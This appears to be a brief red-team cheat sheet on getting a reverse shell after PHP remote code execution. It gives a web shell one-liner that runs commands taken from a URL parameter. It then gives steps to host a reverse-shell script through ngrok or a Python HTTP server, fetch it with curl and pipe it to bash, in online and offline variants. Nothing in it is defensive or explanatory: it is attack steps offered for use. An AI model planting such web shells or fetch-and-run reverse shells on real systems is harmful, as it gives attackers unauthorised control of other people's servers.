#Red-Team #Generation #Payload 


## Online

#### First get the RCE with `<?php system($_GET['cmd']); >` or `<?php system('whoami') ?>` then get the reverseshell from **resh.vercel.app/IP:Port**. Paste in a File that you host with *ngrok* per port **80** or **443**. Access the File at the end with `curl ngrok:123412/idk|bash`


## Offline 

#### First get the RCE with `<?php system($_GET['cmd']); >` then get the reverseshell from **resh.vercel.app/IP:Port**. Paste in a File that you host with ``python3 -m http.server 80`` then access it with `http://10.10.xx.xx/x|bash`